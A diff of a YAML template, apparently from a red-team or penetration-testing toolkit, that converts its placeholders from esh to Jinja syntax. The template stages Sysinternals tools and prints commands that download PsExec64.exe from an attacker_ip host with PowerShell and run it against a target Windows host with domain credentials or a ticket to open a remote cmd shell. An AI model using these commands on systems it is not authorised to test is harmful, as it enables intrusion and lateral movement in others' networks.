@@ -1,18 +1,20 @@
----
 metadata:
-  filename: "deliver-windows-sysinternals.yaml"
-  tags: ["windows", "domain"]
-  created: "2025-03-29"
-  author: "Unknown"
-
-content: |
-  mkdir -p packstation/outbound; cp -n <%=$(esh variables/tools_dir)%>/sysinternals/* packstation/outbound; \
-  echo '================================================================'; \
-  echo '                      -----PowerShell-----                      '; \
-  echo 'Deliver, Save to disk (PsExec64.exe): iwr -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/PsExec64.exe -Outfile <%=$(esh variables/delivery_path_windows)%>\PsExec64.exe'; \
-  echo 'Run (PsExec64.exe - with creds): <%=$(esh variables/delivery_path_windows)%>\PsExec64.exe -i \\\<target_hostname> -u <domain>\<target_user> -p <password> cmd'; \
-  echo 'Run (PsExec64.exe - tgt): <%=$(esh variables/delivery_path_windows)%>\PsExec64.exe \\\<target_hostname> cmd'; \
-  echo '================================================================'; \
-  echo '                         -----CMD-----                          '; \
-  echo '================================================================'; \
-   python <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py -p <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
+  filename: deliver-windows-sysinternals.yaml
+  tags:
+  - windows
+  - domain
+  created: '2025-03-29'
+  author: Unknown
+content: "mkdir -p packstation/outbound; cp -n {{ tools_dir }}/sysinternals/* packstation/outbound;\
+  \ \\\necho '================================================================'; \\\
+  \necho '                      -----PowerShell-----                      '; \\\n\
+  echo 'Deliver, Save to disk (PsExec64.exe): iwr -uri http://{{ attacker_ip }}:{{\
+  \ delivery_outbound_port }}/PsExec64.exe -Outfile {{ delivery_path_windows }}\\\
+  PsExec64.exe'; \\\necho 'Run (PsExec64.exe - with creds): {{ delivery_path_windows\
+  \ }}\\PsExec64.exe -i \\\\\\<target_hostname> -u <domain>\\<target_user> -p <password>\
+  \ cmd'; \\\necho 'Run (PsExec64.exe - tgt): {{ delivery_path_windows }}\\PsExec64.exe\
+  \ \\\\\\<target_hostname> cmd'; \\\necho '================================================================';\
+  \ \\\necho '                         -----CMD-----                          '; \\\
+  \necho '================================================================'; \\\n\
+  \ python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port\
+  \ }} -d packstation/outbound\n"
